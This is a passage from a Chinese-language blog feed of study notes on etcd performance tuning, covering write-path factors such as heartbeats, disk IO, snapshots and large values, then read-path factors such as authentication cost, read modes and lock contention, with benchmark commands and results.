timeout（默认1000ms），Follower节点就会发起新一轮的Leader选举。</p><p>哪些原因会导致心跳超时呢？</p><p>一方面可能是磁盘IO比较慢。因为etcd从Raft的Ready结构获取到相关待提交日志条目后，它需要将此消息写入到WAL日志中持久化。可以通过观察etcd_wal_fsync_durations_seconds_bucket指标来确定写WAL日志的延时。若延时较大，可以使用SSD硬盘解决。</p><p>另一方面也可能是CPU使用率过高和网络延时过大导致。CPU使用率较高可能导致发送心跳的goroutine出现饥饿。若etcd集群跨地域部署，节点之间RTT延时大，也可能会导致此问题。</p><p>最后应该如何调整心跳相关参数，以避免频繁Leader选举呢？</p><p>etcd默认心跳间隔是100ms，较小的心跳间隔会导致发送频繁的消息，消耗CPU和网络资源。而较大的心跳间隔，又会导致检测到Leader故障不可用耗时过长，影响业务可用性。一般情况下，为了避免频繁Leader切换，可以根据实际部署环境、业务场景，将心跳间隔时间调整到100ms到400ms左右，选举超时时间要求至少是心跳间隔的10倍。</p><h2 id="网络和磁盘IO延时"><a href="#网络和磁盘IO延时" class="headerlink" title="网络和磁盘IO延时"></a>网络和磁盘IO延时</h2><p>当集群Leader稳定后，就可以进入Raft日志同步流程。</p><p>假设收到写请求的节点就是Leader，写请求通过Propose接口提交到Raft模块后，Raft模块会输出一系列消息。</p><p>etcd server的raftNode goroutine通过Raft模块的输出接口Ready，获取到待发送给Follower的日志条目追加消息和待持久化的日志条目。</p><p>raftNode goroutine首先通过HTTP协议将日志条目追加消息广播给各个Follower节点，也就是流程五。</p><p><img src="https://static001.geekbang.org/resource/image/8d/eb/8dd9d414eb4ef3ba9a7603fayy991aeb.png?wh=1920*1254" alt="img"></p><p>流程五涉及到各个节点之间网络通信，因此节点之间RTT延时对其性能有较大影响。跨可用区、跨地域部署时性能会出现一定程度下降，建议你结合实际网络环境使用benchmark工具测试一下。etcd Raft网络模块在实现上，也会通过流式发送和pipeline等技术优化来降低延时、提高网络性能。</p><p>同时，raftNode goroutine也会将待持久化的日志条目追加到WAL中，它可以防止进程crash后数据丢失，也就是流程六。注意此过程需要同步等待数据落地，因此磁盘顺序写性能决定着性能优异。</p><p>为了提升写吞吐量，etcd会将一批日志条目批量持久化到磁盘。etcd是个对磁盘IO延时非常敏感的服务，如果服务对性能、稳定性有较大要求，建议你使用SSD盘。</p><p>那使用SSD盘的etcd集群和非SSD盘的etcd集群写性能差异有多大呢？</p><p>下面是SSD盘集群，执行如下benchmark命令的压测结果，写QPS 51298，平均延时189ms。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">benchmark <span class="hljs-attribute">--endpoints</span>=addr <span class="hljs-attribute">--conns</span>=100 <span class="hljs-attribute">--clients</span>=1000 \<br>    put <span class="hljs-attribute">--key-size</span>=8 --sequential-keys <span class="hljs-attribute">--total</span>=10000000 --<br><span class="hljs-attribute">val-size</span>=256<br><br></code></pre></td></tr></table></figure><p><img src="https://static001.geekbang.org/resource/image/91/14/913e9875ef32df415426a3e5e7cff814.png?wh=1424*1364" alt="img"></p><p>下面是非SSD盘集群，执行同样benchmark命令的压测结果，写QPS 35255，平均延时279ms。</p><p><img src="https://static001.geekbang.org/resource/image/17/2f/1758a57804be463228e6431a388c552f.png?wh=1432*1354" alt="img"></p><h2 id="快照参数优化"><a href="#快照参数优化" class="headerlink" title="快照参数优化"></a>快照参数优化</h2><p>在Raft模块中，正常情况下，Leader可快速地将key-value写请求同步给其他Follower节点。但是某Follower节点若数据落后太多，Leader内存中的Raft日志已经被compact了，那么Leader只能发送一个快照给Follower节点重建恢复。</p><p>在快照较大的时候，发送快照可能会消耗大量的CPU、Memory、网络资源，那么它就会影响读写性能，也就是图中的流程七。</p><p><img src="https://static001.geekbang.org/resource/image/1a/38/1ab7a084e61d84f44b893a0fbbdc0138.png?wh=1920*1262" alt="img"></p><p>一方面， etcd Raft模块引入了流控机制，来解决日志同步过程中可能出现的大量资源开销、导致集群不稳定的问题。</p><p>另一方面，可以通过快照参数优化，去降低Follower节点通过Leader快照重建的概率，使其尽量能通过增量的日志同步保持集群的一致性。</p><p>etcd提供了一个名为–snapshot-count的参数来控制快照行为。它是指收到多少个写请求后就触发生成一次快照，并对Raft日志条目进行压缩。为了帮助slower Follower赶上Leader进度，etcd在生成快照，压缩日志条目的时候也会至少保留5000条日志条目在内存中。</p><p>那snapshot-count参数设置多少合适呢?</p><p>snapshot-count值过大它会消耗较多内存，可以参考15内存篇中Raft日志内存占用分析。过小则的话在某节点数据落后时，如果它请求同步的日志条目Leader已经压缩了，此时就不得不将整个db文件发送给落后节点，然后进行快照重建。</p><p>快照重建是极其昂贵的操作，对服务质量有较大影响，因此需要尽量避免快照重建。etcd 3.2版本之前snapshot-count参数值是1万，比较低，短时间内大量写入就较容易触发慢的Follower节点快照重建流程。etcd 3.2版本后将其默认值调大到10万，老版本升级的时候，需要注意配置文件是否写死固定的参数值。</p><h2 id="大value"><a href="#大value" class="headerlink" title="大value"></a>大value</h2><p>当写请求对应的日志条目被集群多数节点确认后，就可以提交到状态机执行了。etcd的raftNode goroutine就可通过Raft模块的输出接口Ready，获取到已提交的日志条目，然后提交到Apply模块的FIFO待执行队列。因为它是串行应用执行命令，任意请求在应用到状态机时阻塞都会导致写性能下降。</p><p>当Raft日志条目命令从FIFO队列取出执行后，它会首先通过授权模块校验是否有权限执行对应的写操作，对应图中的流程八。影响其性能因素是RBAC规则数和锁。</p><p><img src="https://static001.geekbang.org/resource/image/53/f6/5303f1b003480d2ddfe7dbd56b05b3f6.png?wh=1920*1179" alt="img"></p><p>然后通过权限检查后，写事务则会从treeIndex模块中查找key、更新的key版本号等信息，对应图中的流程九，影响其性能因素是key数和锁。</p><p>更新完索引后，就可以把新版本号作为boltdb key， 把用户key&#x2F;value、版本号等信息组合成一个value，写入到boltdb，对应图中的流程十，影响其性能因素是大value、锁。</p><p>如果你在应用中保存1Mb的value，这会给etcd稳定性带来哪些风险呢？</p><p>首先会导致读性能大幅下降、内存突增、网络带宽资源出现瓶颈等，上节课我已和你分享过一个1MB的key-value读性能压测结果，QPS从17万骤降到1100多。</p><p>那么写性能具体会下降到多少呢？</p><p>通过benchmark执行如下命令写入1MB的数据时候，集群几乎不可用（三节点8核16G，非SSD盘），事务提交P99延时高达4秒，如下图所示。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">benchmark <span class="hljs-attribute">--endpoints</span>=addr <span class="hljs-attribute">--conns</span>=100 <span class="hljs-attribute">--clients</span>=1000 \<br>put <span class="hljs-attribute">--key-size</span>=8 --sequential-keys <span class="hljs-attribute">--total</span>=500 --val-<br><span class="hljs-attribute">size</span>=1024000<br><br></code></pre></td></tr></table></figure><p><img src="https://static001.geekbang.org/resource/image/0c/bb/0c2635d617245f5d4084fbe48820e4bb.png?wh=1007*157" alt="img"></p><p>因此只能将写入的key-value大小调整为100KB。执行后得到如下结果，写入QPS 仅为1119&#x2F;S，平均延时高达324ms。</p><p><img src="https://static001.geekbang.org/resource/image/a7/63/a745af37d76208c08be147ac46018463.png?wh=1302*1324" alt="img"></p><p>其次etcd底层使用的boltdb存储，它是个基于COW(Copy-on-write)机制实现的嵌入式key-value数据库。较大的value频繁更新，因为boltdb的COW机制，会导致boltdb大小不断膨胀，很容易超过默认db quota值，导致无法写入。</p><p>那如何优化呢？</p><p>首先，如果业务已经使用了大key，拆分、改造存在一定客观的困难，那就从问题的根源之一的写入对症下药，尽量不要频繁更新大key，这样etcd db大小就不会快速膨胀。</p><p>可以从业务场景考虑，判断频繁的更新是否合理，能否做到增量更新。之前遇到一个case， 一个业务定时更新大量key，导致被限速，最后业务通过增量更新解决了问题。</p><p>如果写请求降低不了， 就必须进行精简、拆分数据结构了。将需要频繁更新的数据拆分成小key进行更新等，实现将value值控制在合理范围以内，才能让集群跑的更稳、更高效。</p><p>Kubernetes的Node心跳机制优化就是这块一个非常优秀的实践。早期kubelet会每隔10s上报心跳更新Node资源。但是此资源对象较大，导致db大小不断膨胀，无法支撑更大规模的集群。为了解决这个问题，社区做了数据拆分，将经常变更的数据拆分成非常细粒度的对象，实现了集群稳定性提升，支撑住更大规模的Kubernetes集群。</p><h2 id="boltdb锁"><a href="#boltdb锁" class="headerlink" title="boltdb锁"></a>boltdb锁</h2><p>了解完大value对集群性能的影响后，我们再看影响流程十的另外一个核心因素boltdb锁。</p><p>首先我们回顾下etcd读写性能优化历史，它经历了以下流程：</p><ul><li>3.0基于Raft log read实现线性读，线性读需要经过磁盘IO，性能较差；</li><li>3.1基于ReadIndex实现线性读，每个节点只需要向Leader发送ReadIndex请求，不涉及磁盘IO，提升了线性读性能；</li><li>3.2将访问boltdb的锁从互斥锁优化到读写锁，提升了并发读的性能；</li><li>3.4实现全并发读，去掉了buffer锁，长尾读几乎不再影响写。</li></ul><p>并发读特性的核心原理是创建读事务对象时，它会全量拷贝当前写事务未提交的buffer数据，并发的读写事务不再阻塞在一个buffer资源锁上，实现了全并发读。</p><p>最重要的是，写事务也不再因为expensive read request长时间阻塞，有效的降低了写请求的延时，详细测试结果可以参考 <a href="https://github.com/etcd-io/etcd/pull/10523">并发读特性实现PR</a>。</p><h2 id="扩展性能"><a href="#扩展性能" class="headerlink" title="扩展性能"></a>扩展性能</h2><p>当然有不少业务场景你即便用最高配的硬件配置，etcd可能还是无法解决你所面临的性能问题。etcd社区也考虑到此问题，提供了一个名为 <a href="https://etcd.io/docs/v3.4.0/op-guide/grpc_proxy/">gRPC proxy</a> 的组件，帮助你扩展读、扩展watch、扩展Lease性能的机制，如下图所示。</p><p><img src="https://static001.geekbang.org/resource/image/4a/b1/4a13ec9a4f93931e6e0656c600c2d3b1.png?wh=1920*1042" alt="img"></p><h3 id="扩展读"><a href="#扩展读" class="headerlink" title="扩展读"></a>扩展读</h3><p>如果client比较多，etcd集群节点连接数大于2万，或者想平行扩展串行读的性能，那么gRPC proxy就是良好一个解决方案。它是个无状态节点，提供高性能的读缓存的能力。可以根据业务场景需要水平扩容若干节点，同时通过连接复用，降低服务端连接数、负载。</p><p>它也提供了故障探测和自动切换能力，当后端etcd某节点失效后，会自动切换到其他正常节点，业务client可对此无感知。</p><h3 id="扩展Watch"><a href="#扩展Watch" class="headerlink" title="扩展Watch"></a>扩展Watch</h3><p>大量的watcher会显著增大etcd server的负载，导致读写性能下降。etcd为了解决这个问题，gRPC proxy组件里面提供了watcher合并的能力。如果多个client Watch同key或者范围（如上图三个client Watch同key）时，它会尝试将你的watcher进行合并，降低服务端的watcher数。</p><p>然后当它收到etcd变更消息时，会根据每个client实际Watch的版本号，将增量的数据变更版本，分发给你的多个client，实现watch性能扩展及提升。</p><h3 id="扩展Lease"><a href="#扩展Lease" class="headerlink" title="扩展Lease"></a>扩展Lease</h3><p>我们知道etcd Lease特性，提供了一种客户端活性检测机制。为了确保你的key不被淘汰，client需要定时发送keepalive心跳给server。当Lease非常多时，这就会导致etcd服务端的负载增加。在这种场景下，gRPC proxy提供了keepalive心跳连接合并的机制，来降低服务端负载。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>通过从上至下的写请求流程分析，介绍了各个流程中可能存在的瓶颈和优化方法、最佳实践。讨论的etcd性能优化、扩展问题分为了以下几类：</p><ul><li>业务应用层，etcd应用层的最佳实践；</li><li>etcd内核层，etcd参数最佳实践；</li><li>操作系统层，操作系统优化事项；</li><li>硬件及网络层，不同的硬件设备对etcd性能有着非常大的影响；</li><li>扩展性能，基于gRPC proxy扩展读、Watch、Lease的性能。</li></ul><p><img src="https://static001.geekbang.org/resource/image/92/87/928a4f1e66200531f5ee73aab000ce87.png?wh=1920*1091" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>16.性能及稳定性（上）：如何优化及扩展etcd读性能？</title>
    <link href="/2022/10/09/16-%E6%80%A7%E8%83%BD%E5%8F%8A%E7%A8%B3%E5%AE%9A%E6%80%A7%EF%BC%88%E4%B8%8A%EF%BC%89%EF%BC%9A%E5%A6%82%E4%BD%95%E4%BC%98%E5%8C%96%E5%8F%8A%E6%89%A9%E5%B1%95etcd%E8%AF%BB%E6%80%A7%E8%83%BD%EF%BC%9F/"/>
    <url>/2022/10/09/16-%E6%80%A7%E8%83%BD%E5%8F%8A%E7%A8%B3%E5%AE%9A%E6%80%A7%EF%BC%88%E4%B8%8A%EF%BC%89%EF%BC%9A%E5%A6%82%E4%BD%95%E4%BC%98%E5%8C%96%E5%8F%8A%E6%89%A9%E5%B1%95etcd%E8%AF%BB%E6%80%A7%E8%83%BD%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="16-性能及稳定性（上）：如何优化及扩展etcd读性能？"><a href="#16-性能及稳定性（上）：如何优化及扩展etcd读性能？" class="headerlink" title="16.性能及稳定性（上）：如何优化及扩展etcd读性能？"></a>16.性能及稳定性（上）：如何优化及扩展etcd读性能？</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><h2 id="读性能分析链路"><a href="#读性能分析链路" class="headerlink" title="读性能分析链路"></a>读性能分析链路</h2><p>为什么在业务场景中读性能不如预期呢？ 是读流程中的哪一个环节出现了瓶颈？</p><p>在下图中，总结了一个开启密码鉴权场景的读性能瓶颈分析链路图，并在每个核心步骤数字旁边，标出了影响性能的关键因素。之所以选用密码鉴权的读请求为案例，是因为它使用较广泛并且请求链路覆盖最全，同时它也是最容易遇到性能瓶颈的场景。</p><p><img src="https://static001.geekbang.org/resource/image/7f/52/7f8c66ded3e151123b18768b880a2152.png?wh=1920*1253" alt="img"></p><p>接下来按照这张链路分析图，深入分析一个使用密码鉴权的线性读请求，一起看看影响它性能表现的核心因素以及最佳优化实践。</p><h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>首先是流程一负载均衡。在etcd 3.4以前，client为了节省与server节点的连接数，clientv3负载均衡器最终只会选择一个sever节点IP，与其建立一个长连接。</p><p>但是这可能会导致对应的server节点过载（如单节点流量过大，出现丢包）， 其他节点却是低负载，最终导致业务无法获得集群的最佳性能。在etcd 3.4后，引入了Round-robin负载均衡算法，它通过轮询的方式依次从endpoint列表中选择一个endpoint访问(长连接)，使server节点负载尽量均衡。</p><p>所以，如果使用的是etcd低版本，那么通过Load Balancer访问后端etcd集群。因为一方面Load Balancer一般支持配置各种负载均衡算法，如连接数、Round-robin等，可以使集群负载更加均衡，规避etcd client早期的固定连接缺陷，获得集群最佳性能。</p><p>另一方面，当集群节点需要替换、扩缩容集群节点的时候，不需要去调整各个client访问server的节点配置。</p><h2 id="选择合适的鉴权"><a href="#选择合适的鉴权" class="headerlink" title="选择合适的鉴权"></a>选择合适的鉴权</h2><p>client通过负载均衡算法为请求选择好etcd server节点后，client就可调用server的Range RPC方法，把请求发送给etcd server。在此过程中，如果server启用了鉴权，那么就会返回无权限相关错误给client。</p><p>如果server使用的是密码鉴权，你在创建client时，需指定用户名和密码。etcd clientv3库发现用户名、密码非空，就会先校验用户名和密码是否正确。</p><p>client是如何向sever请求校验用户名、密码正确性的呢？</p><p>client是通过向server发送Authenticate RPC鉴权请求实现密码认证的，也就是图中的流程二。</p><p><img src="https://static001.geekbang.org/resource/image/9e/61/9e1fb86567b351641db9586081c0e361.png?wh=1920*1267" alt="img"></p><p>根据之前介绍的密码认证原理，server节点收到鉴权请求后，它会从boltdb获取此用户密码对应的算法版本、salt、cost值，并基于用户的请求明文密码计算出一个hash值。</p><p>在得到hash值后，就可以对比db里保存的hash密码是否与其一致了。如果一致，就会返回一个token给client。 这个token是client访问server节点的通行证，后续server只需要校验“通行证”是否有效即可，无需每次发起昂贵的Authenticate RPC请求。</p><p>若你的业务在访问etcd过程中未复用token，每次访问etcd都发起一次Authenticate调用，这将是一个非常大的性能瓶颈和隐患。为了保证密码的安全性，密码认证（Authenticate）的开销非常昂贵，涉及到大量CPU资源。</p><p>那这个Authenticate接口究竟有多慢呢？</p><p>为了得到Authenticate接口的性能，一个测试：</p><ul><li>压测集群etcd节点配置是16核32G；</li><li>压测方式是通过修改etcd clientv3库、benchmark工具，使benchmark工具支持Authenticate接口压测；</li><li>然后设置不同的client和connection参数，运行多次，观察结果是否稳定，获取测试结果。</li></ul><p>最终的测试结果非常惊人。etcd v3.4.9之前的版本，Authenticate接口性能不到16 QPS，并且随着client和connection增多，该性能会继续恶化。</p><p>当client和connection的数量达到200个的时候，性能会下降到8 QPS，P99延时为18秒，如下图所示。</p><p><img src="https://static001.geekbang.org/resource/image/bc/c4/bc6336b93de53e6650bd7a5565ef8ec4.png?wh=1470*1284" alt="img"></p><p>由于导致Authenticate接口性能差的核心瓶颈，是在于密码鉴权使用了bcrpt计算hash值，因此Authenticate性能已接近极限。</p><p><img src="https://static001.geekbang.org/resource/image/44/aa/449bb47bef89a7cf1d2fbb1205a15faa.png?wh=1286*1362" alt="img"></p><p>最令人头疼的是，Auenticate的调用由clientv3库默默发起的，etcd中也没有任何日志记录其耗时等。当大家开启密码鉴权后，遇到读写接口超时的时候，未详细了解etcd的同学就会非常困惑，很难定位超时本质原因。</p><p>问题大都是由比较频繁的Authenticate调用导致，只要临时关闭鉴权或升级到etcd v3.4.9版本就可以恢复。</p><p>密码鉴权的性能如此差，可是业务又需要使用它，该怎么解决密码鉴权的性能问题呢？对此，三点建议。</p><p>第一，如果你的生产环境需要开启鉴权，并且读写QPS较大，不要图省事使用密码鉴权。最好使用证书鉴权，这样能完美避坑认证性能差、token过期等问题，性能几乎无损失。</p><p>第二，确保业务每次发起请求时有复用token机制，尽可能减少Authenticate RPC调用。</p><p>第三，如果使用密码鉴权时遇到性能瓶颈问题，可将etcd升级到3.4.9及以上版本，能适当提升密码鉴权的性能。</p><h2 id="选择合适的读模式"><a href="#选择合适的读模式" class="headerlink" title="选择合适的读模式"></a>选择合适的读模式</h2><p>client通过server的鉴权后，就可以发起读请求调用了，也就是图中的流程三。</p><p><img src="https://static001.geekbang.org/resource/image/58/9a/5832f5da0f916b941b1d832e9fe2e29a.png?wh=1920*1270" alt="img"></p><p>在这个步骤中，读模式对性能有着至关重要的影响。前面讲过etcd提供了串行读和线性读两种读模式。前者因为不经过ReadIndex模块，具有低延时、高吞吐量的特点；而后者在牺牲一点延时和吞吐量的基础上，实现了数据的强一致性读。这两种读模式分别为不同场景的读提供了解决方案。</p><p>关于串行读和线性读的性能对比，下图给出了一个测试结果，测试环境如下：</p><ul><li>机器配置client 16核32G，三个server节点8核16G、SSD盘，client与server节点都在同可用区；</li><li>各节点之间RTT在0.1ms到0.2ms之间；</li><li>etcd v3.4.9版本；</li><li>1000个client。</li></ul><p>执行如下串行读压测命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">benchmark <span class="hljs-attribute">--endpoints</span>=addr <span class="hljs-attribute">--conns</span>=100 <span class="hljs-attribute">--clients</span>=1000 \<br>range hello <span class="hljs-attribute">--consistency</span>=s <span class="hljs-attribute">--total</span>=500000<br><br></code></pre></td></tr></table></figure><p>得到串行读压测结果如下，32万 QPS，平均延时2.5ms。</p><p><img src="https://static001.geekbang.org/resource/image/3d/9a/3d18aafb016a93e8d2f07a4193cb6b9a.png?wh=1426*1336" alt="img"></p><p>执行如下线性读压测命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">benchmark <span class="hljs-attribute">--endpoints</span>=addr <span class="hljs-attribute">--conns</span>=100 <span class="hljs-attribute">--clients</span>=1000 \<br>range hello <span class="hljs-attribute">--consistency</span>=l <span class="hljs-attribute">--total</span>=500000<br><br></code></pre></td></tr></table></figure><p>得到线性读压测结果如下，19万 QPS，平均延时4.9ms。</p><p><img src="https://static001.geekbang.org/resource/image/83/0d/831338d142bc44999cc6c3b04147yy0d.png?wh=1474*1346" alt="img"></p><p>从两个压测结果图中你可以看到，在100个连接时，串行读性能比线性读性能高近11万&#x2F;s，串行读请求延时（2.5ms）比线性读延时约低一半（4.9ms）。</p><p><strong>需要注意的是，以上读性能数据是在1个key、没有任何写请求、同可用区的场景下压测出来的，实际的读性能会随着你的写请求增多而出现显著下降，这也是实际业务场景性能与社区压测结果存在非常大差距的原因之一。</strong> 建议使用etcd benchmark工具在etcd集群环境中自测一下，也可以参考下面的 <a href="https://etcd.io/docs/v3.4.0/op-guide/performance/">etcd社区压测结果</a>。</p><p><img src="https://static001.geekbang.org/resource/image/58/ca/58135ebf14a25e3f74004929369867ca.png?wh=1398*590" alt="img"></p><p>如果业务场景读QPS较大，但是又不想通过etcd proxy等机制来扩展性能，那可以进一步评估业务场景对数据一致性的要求高不高。如果可以容忍短暂的不一致，那你可以通过串行读来提升etcd的读性能，也可以部署Learner节点给可能会产生expensive read request的业务使用，实现cheap&#x2F;expensive read request隔离。</p><h2 id="线性读实现机制、网络延时"><a href="#线性读实现机制、网络延时" class="headerlink" title="线性读实现机制、网络延时"></a>线性读实现机制、网络延时</h2><p>了解完读模式对性能的影响后，我们继续往下分析。在我们这个密码鉴权读请求的性能分析案例中，读请求使用的是etcd默认线性读模式。线性读对应图中的流程四、流程五，其中流程四对应的是ReadIndex，流程五对应的是等待本节点数据追上Leader的进度（ApplyWait）。</p><p><img src="https://static001.geekbang.org/resource/image/f0/f1/f018b98629360e7c6eef6f9cfb0241f1.png?wh=1920*1162" alt="img"></p><p>在早期的etcd 3.0版本中，etcd线性读是基于Raft log read实现的。每次读请求要像写请求一样，生成一个Raft日志条目，然后提交给Raft一致性模块处理，基于Raft日志执行的有序性来实现线性读。因为该过程需要经过磁盘I&#x2F;O，所以性能较差。</p><p>为了解决Raft log read的线性读性能瓶颈，etcd 3.1中引入了ReadIndex。ReadIndex仅涉及到各个节点之间网络通信，因此节点之间的RTT延时对其性能有较大影响。虽然同可用区可获取到最佳性能，但是存在单可用区故障风险。如果你想实现高可用区容灾的话，那就必须牺牲一点性能了。</p><p>跨可用区部署时，各个可用区之间延时一般在2毫秒内。如果跨城部署，服务性能就会下降较大。所以一般场景下我不建议你跨城部署，你可以通过Learner节点实现异地容灾。如果异地的服务对数据一致性要求不高，那么你甚至可以通过串行读访问Learner节点，来实现就近访问，低延时。</p><p>各个节点之间的RTT延时，是决定流程四ReadIndex性能的核心因素之一。</p><h2 id="磁盘IO性能、写QPS"><a href="#磁盘IO性能、写QPS" class="headerlink" title="磁盘IO性能、写QPS"></a>磁盘IO性能、写QPS</h2><p>到了流程五，影响性能的核心因素就是磁盘IO延时和写QPS。</p><p><img src="https://static001.geekbang.org/resource/image/73/bc/732ec57338e1yy1d932e959ed776c0bc.png?wh=1920*1336" alt="img"></p><p>如下面代码所示，流程五是指节点从Leader获取到最新已提交的日志条目索引(rs.Index)后，它需要等待本节点当前已应用的Raft日志索引，大于等于Leader的已提交索引，确保能在本节点状态机中读取到最新数据。</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-keyword">if</span> ai := s.getAppliedIndex(); ai &lt; rs.<span class="hljs-built_in">Index</span> &#123;<br>   <span class="hljs-keyword">select</span> &#123;<br>   <span class="hljs-keyword">case</span> &lt;-s.applyWait.<span class="hljs-keyword">Wait</span>(rs.<span class="hljs-built_in">Index</span>):<br>   <span class="hljs-keyword">case</span> &lt;-s.stopping:<br>      <span class="hljs-keyword">return</span><br>   &#125;<br>&#125;<br>// unblock <span class="hljs-built_in">all</span> l-reads requested at indices before rs.<span class="hljs-built_in">Index</span><br>nr.notify(nil)<br><br></code></pre></td></tr></table></figure><p>而应用已提交日志条目到状态机的过程中又涉及到随机写磁盘，详情可参考我们 <a href="https://time.geekbang.org/column/article/336766">03</a> 中介绍过etcd的写请求原理。</p><p>因此可以知道， <strong>etcd是一个对磁盘IO性能非常敏感的存储系统，磁盘IO性能不仅会影响Leader稳定性、写性能表现，还会影响读性能。线性读性能会随着写性能的增加而快速下降。如果业务对性能、稳定性有较大要求，建议尽量使用SSD盘。</strong></p><p>下表给出了一个8核16G的三节点集群，在总key数只有一个的情况下，随着写请求增大，线性读性能下降的趋势总结（基于benchmark工具压测结果），可以直观感受下读性能是如何随着写性能下降。</p><p><img src="https://static001.geekbang.org/resource/image/40/5a/4069e72370942764ef4905715267c05a.jpg?wh=1475*620" alt="img"></p><p>当本节点已应用日志条目索引大于等于Leader已提交的日志条目索引后，读请求就会接到通知，就可通过MVCC模块获取数据。</p><h2 id="RBAC规则数、Auth锁"><a href="#RBAC规则数、Auth锁" class="headerlink" title="RBAC规则数、Auth锁"></a>RBAC规则数、Auth锁</h2><p>读请求到了MVCC模块后，首先要通过鉴权模块判断此用户是否有权限访问请求的数据路径，也就是流程六。影响流程六的性能因素是你的RBAC规则数和锁。</p><p>首先是RBAC规则数，为了解决快速判断用户对指定key范围是否有权限，etcd为每个用户维护了读写权限区间树。基于区间树判断用户访问的范围是否在用户的读写权限区间内，时间复杂度仅需要O(logN)。</p><p>另外一个因素则是AuthStore的锁。在etcd 3.4.9之前的，校验密码接口可能会占用较长时间的锁，导致授权接口阻塞。etcd 3.4.9之后合入了缩小锁范围的PR，可一定程度降低授权接口被阻塞的问题。</p><h2 id="expensive-request、treeIndex锁"><a href="#expensive-request、treeIndex锁" class="headerlink" title="expensive request、treeIndex锁"></a>expensive request、treeIndex锁</h2><p>通过流程六的授权后，则进入流程七，从treeIndex中获取整个查询涉及的key列表版本号信息。在这个流程中，影响其性能的关键因素是treeIndex的总key数、查询的key数、获取treeIndex锁的耗时。</p><p><img src="https://static001.geekbang.org/resource/image/9d/da/9dfe22355a9fd841943fb1c4556db9da.png?wh=1920*1272" alt="img"></p><p>首先，treeIndex中总key数过多会适当增大遍历的耗时。</p><p>其次，若要访问treeIndex我们必须获取到锁，但是可能其他请求如compact操作也会获取锁。早期的时候，它需要遍历所有索引，然后进行数据压缩工作。这就会导致其他请求阻塞，进而增大延时。</p><p>为了解决这个性能问题，优化方案是compact的时候会将treeIndex克隆一份，以空间来换时间，尽量降低锁阻塞带来的超时问题。</p><p>接下来重点介绍查询key数较多等expensive read request时对性能的影响。</p><p>假设链路分析图中的请求是查询一个Kubernetes集群所有Pod，当Pod数一百以内的时候可能对etcd影响不大，但是当你Pod数千甚至上万的时候， 流程七、八就会遍历大量的key，导致请求耗时突增、内存上涨、性能急剧下降。</p><p>如果业务就是有这种expensive read request逻辑，我们该如何应对呢？</p><p>首先可以尽量减少expensive read request次数，在程序启动的时候，只List一次全量数据，然后通过etcd Watch机制去获取增量变更数据。比如Kubernetes的Informer机制，就是典型的优化实践。</p><p>其次，在设计上评估是否能进行一些数据分片、拆分等，不同场景使用不同的etcd prefix前缀。比如在Kubernetes中，不要把Pod全部都部署在default命名空间下，尽量根据业务场景按命名空间拆分部署。即便每个场景全量拉取，也只需要遍历自己命名空间下的资源，数据量上将下降一个数量级。</p><p>再次，如果觉得Watch改造大、数据也无法分片，开发麻烦，你可以通过分页机制按批拉取，尽量减少一次性拉取数万条数据。</p><p>最后，如果以上方式都不起作用的话，还可以通过引入cache实现缓存expensive read request的结果，不过应用需维护缓存数据与etcd的一致性。</p><h2 id="大key-value、boltdb锁"><a href="#大key-value、boltdb锁" class="headerlink" title="大key-value、boltdb锁"></a>大key-value、boltdb锁</h2><p>从流程七获取到key列表及版本号信息后，我们就可以访问boltdb模块，获取key-value信息了。在这个流程中，影响其性能表现的，除了我们上面介绍的expensive read request，还有大key-value和锁。</p><p>首先是大key-value。我们知道etcd设计上定位是个小型的元数据存储，它没有数据分片机制，默认db quota只有2G，实践中往往不会超过8G，并且针对每个key-value大小，它也进行了大小限制，默认是1.5MB。</p><p>大key-value非常容易导致etcd OOM、server 节点出现丢包、性能急剧下降等。</p><p>那么当我们往etcd集群写入一个1MB的key-value时，它的线性读性能会从17万QPS具体下降到多少呢?</p><p>我们可以执行如下benchmark命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">benchmark <span class="hljs-attribute">--endpoints</span>=addr <span class="hljs-attribute">--conns</span>=100 <span class="hljs-attribute">--clients</span>=1000 \<br>range key <span class="hljs-attribute">--consistency</span>=l <span class="hljs-attribute">--total</span>=10000<br><br></code></pre></td></tr></table></figure><p>得到其结果如下，从下图可以看到，读取一个1MB的key-value，线性读性能QPS下降到1163，平均延时上升到818ms，可见大key-value对性能的巨大影响。</p><p><img src="https://static001.geekbang.org/resource/image/a0/c7/a0735af4c2efd4156d392f75yyf132c7.png?wh=1296*1324" alt="img"></p><p>同时，从下面的etcd监控图上你也可以看到内存出现了突增，若存在大量大key-value时，可想而知，etcd内存肯定暴涨，大概率会OOM。</p><p><img src="https://static001.geekbang.org/resource/image/95/78/9599ec869c1496e8f9a8e5e54acb5b78.png?wh=1326*412" alt="img"></p><p>其次是锁，etcd为了提升boltdb读的性能，从etcd 